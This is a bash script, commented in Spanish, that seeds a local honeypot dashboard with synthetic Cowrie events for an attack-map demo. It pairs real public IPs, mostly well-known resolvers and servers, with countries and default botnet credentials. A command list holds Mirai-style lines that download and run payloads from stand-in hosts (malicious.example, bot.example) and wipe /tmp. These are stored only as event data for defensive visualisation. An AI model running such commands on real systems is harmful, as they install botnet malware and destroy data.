#!/usr/bin/env bash
# Siembra eventos de honeypot con IPs públicas reales de varios países, para
# demostrar el mapa/globo de ataques. Son datos de prueba (comportamiento típico
# de botnets). Requiere el backend arriba.
#
# Uso:  ./scripts/seed_honeypot_geo.sh [API_BASE_URL]
set -euo pipefail
API="${1:-http://localhost:8000}"
EP="$API/api/honeypot-events/"

# ip | pais(aprox) | servicio | usuario | contraseña | repeticiones
ROWS=(
  "114.114.114.114|China|SSH|root|123456|9"
  "1.2.4.8|China|Telnet|admin|admin|5"
  "77.88.8.8|Rusia|SSH|root|root|7"
  "5.255.255.70|Rusia|RDP|administrator|P@ssw0rd|4"
  "8.8.8.8|EEUU|SSH|admin|admin|6"
  "4.2.2.2|EEUU|FTP|anonymous|anonymous|3"
  "200.160.2.3|Brasil|SSH|root|toor|5"
  "46.4.0.1|Alemania|SSH|pi|raspberry|4"
  "103.21.244.1|India|Telnet|root|vizxv|6"
  "212.27.48.10|Francia|SSH|ubuntu|ubuntu|3"
  "210.130.0.1|Japon|SSH|root|password|2"
  "211.45.0.1|Corea del Sur|SSH|root|1234|4"
  "14.160.0.1|Vietnam|Telnet|root|xc3511|8"
  "91.198.174.192|Paises Bajos|HTTP|admin|admin|3"
  "36.66.0.1|Indonesia|SSH|root|default|5"
  "41.58.0.1|Nigeria|SSH|admin|1234|2"
)

CMDS=(
  "/bin/busybox MIRAI"
  "wget http://malicious.example/bins.sh; chmod +x bins.sh; ./bins.sh"
  "cat /proc/cpuinfo | grep model"
  "enable\\nsystem\\nshell\\nsh"
  "rm -rf /tmp/*; cd /tmp; curl -O http://bot.example/x86"
)

count=0
for row in "${ROWS[@]}"; do
  IFS='|' read -r ip country svc user pass reps <<< "$row"
  for ((i=0; i<reps; i++)); do
    cmd="${CMDS[$((RANDOM % ${#CMDS[@]}))]}"
    curl -sf -o /dev/null -X POST "$EP" -H 'Content-Type: application/json' -d "$(cat <<JSON
{"honeypot_name":"cowrie","attacker_ip":"$ip","attacker_port":$((1024 + RANDOM % 60000)),
 "target_ip":"10.0.0.5","target_port":22,"service":"$svc",
 "username_attempted":"$user","password_attempted":"$pass","command_executed":"$cmd"}
JSON
)" && count=$((count+1)) || echo "fallo con $ip"
  done
  echo "  $country ($ip): $reps eventos"
done
echo "Total sembrado: $count eventos de honeypot"
